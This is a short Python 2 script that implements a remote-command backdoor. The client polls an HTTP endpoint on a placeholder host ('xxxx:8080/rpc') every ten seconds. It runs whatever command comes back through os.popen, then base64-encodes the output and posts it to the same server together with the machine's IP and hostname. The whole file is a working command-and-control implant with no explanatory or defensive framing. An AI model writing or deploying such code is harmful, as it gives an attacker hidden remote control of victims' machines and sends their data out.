import urllib
import socket
import re
import base64
import os
import time


class client:
    def __init__(self):
        self.historyCmd = ''
        
        
    def get_host_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
        finally:
            s.close()
     
        return ip


    def run(self):
        cmd = urllib.urlopen('http://xxxx:8080/rpc?inip=%s' % self.get_host_ip())
        cmd = cmd.read()
        if self.historyCmd != cmd:
            self.historyCmd = cmd
            res = os.popen(self.historyCmd)
            res = base64.b64encode(res.read())
            
            data = {'inip':self.get_host_ip(),'name':socket.gethostname(),'cmd':self.historyCmd,'res':res}
            data = urllib.urlencode(data)
            callback = urllib.urlopen('http://xxxx:8080/rpc',data)
        

if __name__ == '__main__':
    r = client()
    while True:
        try:
            r.run()
        except Exception,e:
            print e
        finally:
            time.sleep(10)

